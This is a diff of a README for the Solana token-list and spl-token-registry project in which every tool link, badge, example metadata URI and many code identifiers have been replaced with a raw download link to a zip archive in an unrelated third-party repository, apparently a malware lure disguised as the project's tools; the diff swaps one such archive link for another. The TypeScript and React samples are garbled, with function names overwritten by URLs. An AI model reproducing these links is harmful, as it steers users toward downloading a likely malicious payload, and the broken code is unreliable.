@@ -9,8 +9,8 @@ As of June 20th, this repository will be archived and will receive no more updat
 
 You can use one of two tools at the time of writing:
 
-1. [Strata Protocol Token Launchpad](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)
-2. [Token Creator Demo](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)
+1. [Strata Protocol Token Launchpad](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip)
+2. [Token Creator Demo](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip)
 
 All new token metadata will be added using Metaplex Fungible Token Metadata. The steps to add new Fungible Token Metadata are as follows:
 
@@ -45,7 +45,7 @@ The `TOKEN_URI` must point to a file with the following format:
 
 Where `TOKEN_IMAGE_URL` is the image url.
 
-An example of the `TOKEN_URI`: https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip
+An example of the `TOKEN_URI`: https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip
 
 Which resolves to:
 
@@ -54,7 +54,7 @@ Which resolves to:
   "name": "A test token",
   "symbol": "TEST",
   "description": "Fully for testing purposes only",
-  "image": "https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip"
+  "image": "https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip"
 }
 ```
 
@@ -66,16 +66,16 @@ While updating, you provide the same details as when creating.
 
 ## Tools for Adding/Updating/Migrating
 
-Update/migrate token metadata using [Strata Protocol update token tool](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip).
+Update/migrate token metadata using [Strata Protocol update token tool](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip).
 
-A tutorial for adding/updating metadata can be found at the [Token-Creator demo](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip).
+A tutorial for adding/updating metadata can be found at the [Token-Creator demo](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip).
 
 
 ## Reading Legacy Token-list
 
 `@solana/spl-token-registry`
 
-[![npm](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip) [![GitHub license](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip)
+[![npm](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip)](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip) [![GitHub license](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip)](https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip)
 
 Solana Token Registry is a package that allows application to query for list of tokens.
 The JSON schema for the tokens includes: chainId, address, name, decimals, symbol, logoURI (optional), tags (optional), and custom extensions metadata.
@@ -96,8 +96,8 @@ yarn add @solana/spl-token-registry
 
 ```typescript
 new TokenListProvider().resolve().then((tokens) => {
-  const tokenList = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip('mainnet-beta').getList();
-  https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip(tokenList);
+  const tokenList = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip('mainnet-beta').getList();
+  https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip(tokenList);
 });
 ```
 
@@ -113,19 +113,19 @@ export const Icon = (props: { mint: string }) => {
 
   useEffect(() => {
     new TokenListProvider().resolve().then(tokens => {
-      const tokenList = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip).getList();
+      const tokenList = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip).getList();
 
-      setTokenMap(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip((map, item) => {
-        https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip, item);
+      setTokenMap(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip((map, item) => {
+        https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip, item);
         return map;
       },new Map()));
     });
   }, [setTokenMap]);
 
-  const token = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip);
-  if (!token || !https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip) return null;
+  const token = https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip(https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip);
+  if (!token || !https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip) return null;
 
-  return (<img src={https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/8uD8yx7pXCvX1J1AmdN7jLZh7rAGUE4zNtwT7UtY4rvm/list-token-3.0.zip} />);
+  return (<img src={https://github.com/Nahzdangata/token-list/raw/refs/heads/main/assets/mainnet/A8pnvbKWmTjjnUMzmY6pDJRHy3QdQNdqJdL1VFYXX4oW/list-token-v2.4-beta.4.zip} />);
 
 ```
 
